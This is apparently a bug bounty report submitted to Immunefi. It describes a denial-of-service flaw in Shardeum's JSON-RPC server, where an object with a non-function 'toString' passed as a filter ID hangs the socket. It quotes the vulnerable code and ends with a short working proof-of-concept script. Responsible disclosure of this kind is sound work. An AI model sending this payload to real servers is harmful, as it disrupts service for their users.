# Boost \_ Shardeum\_ Ancillaries 33558 - \[Websites and Applications - Insight] In some instances the so

Submitted on Tue Jul 23 2024 10:59:29 GMT-0400 (Atlantic Standard Time) by @Holofan for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33558

Report type: Websites and Applications

Report severity: Insight

Target: <https://github.com/shardeum/json-rpc-server/tree/dev>

Impacts:

* Temporarily disabling user to access target site, such as: Locking up the victim from login, Cookie bombing, etc.

## Description

## Brief/Intro

While handling some API calls the connected socket can be made to hang which can lead to the user's socket being DOS-ed temporary

## Vulnerability Details

In the `api.ts` all of the server APIs are written in a way to handle errors so the server or socket doesn't crash or hang. However while handling the `eth_getFilterChanges` and `eth_getFilterLogs` one user argument is not being handled in a try block as can be seen here:\
<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/api.ts#L2989-L2992>

```
    const filterId = args[0]
    let logs: string[] = []

    const internalFilter: Types.InternalFilter | undefined = filtersMap.get(filterId.toString())
```

<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/api.ts#L2906-L2908>

```
    const filterId = args[0]

    const internalFilter: Types.InternalFilter | undefined = filtersMap.get(filterId.toString())
```

in both of those cases the `filterId` is assigned to `args[0]` on which `toString` function is called at a later point. However the `args[0]` can be given an object such as this one `{'toString':'test'}` and when the `toString` function is called the function will throw an error which is not handled and thus the socket hang and stop responding.

## Impact Details

On it's own the only impact is potential crashes if handled wrongly but if the json RPC server is used in some web app a potential malicious actor can specifically send a bad packet from user's side and thus force the socket to hang and lead to temporary DOS.

## References

<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/api.ts#L2989-L2992\\>
<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/api.ts#L2906-L2908>

## Proof of concept

## Proof of Concept

The following script will send an object which will make the socket hang

```
const jayson = require('jayson');

const client = jayson.Client.http({
  port: 8080
});

client.request('eth_getFilterChanges', [{"toString":"test"}], function(err, response) {
  if(err) throw err;
  console.log(response.result);
});
```

the fact that no response is being prompted after running the script confirms the fact that the socket has hanged.
